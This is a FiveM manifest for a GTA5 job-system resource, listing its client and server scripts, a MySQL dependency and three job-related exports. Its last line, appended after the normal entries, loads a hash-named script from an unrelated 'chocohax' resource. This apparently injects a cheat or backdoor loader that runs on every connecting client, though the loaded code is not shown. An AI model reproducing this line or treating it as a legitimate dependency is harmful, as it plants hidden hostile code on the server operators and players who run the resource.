fx_version 'bodacious'
game 'gta5'

author 'wulinworks'
description ''
version '1.0.0'

client_scripts {
    'config.lua',
    'jobs/*.lua',
    'client.lua'
}
server_scripts {
    '@mysql-async/lib/MySQL.lua',
    'config.lua',
    'jobs/*.lua',
    'server.lua'
}

server_exports {
    'GetMkJob',
    'GetPlayerMkJob',
    'SetPlayerMkJob'
}
client_script '@chocohax/3a8edc97804897d949f78eac09528d6204ce579e0a.lua'